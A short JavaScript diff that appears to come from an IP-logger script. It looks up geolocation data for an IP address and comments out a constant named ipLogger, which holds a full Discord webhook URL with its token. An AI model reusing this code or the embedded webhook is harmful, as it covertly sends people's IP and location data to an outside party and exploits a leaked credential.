@@ -1,7 +1,7 @@
 fetch('http://ip-api.com/json/24.48.0.1')
   .then(response => response.json())
   .then(data => {
-    const ipLogger = "https://discord.com/api/webhooks/1531634930948247713/H0W_yonQXNyc1JLYHZx_FOxteN36mqO1s61btCPEoohG6ZtyCCxHH3GlspeR5pp-xlWI";
+    //const ipLogger = "https://discord.com/api/webhooks/1531634930948247713/H0W_yonQXNyc1JLYHZx_FOxteN36mqO1s61btCPEoohG6ZtyCCxHH3GlspeR5pp-xlWI";
     const request = new XMLHttpRequest();
 
     // Variables
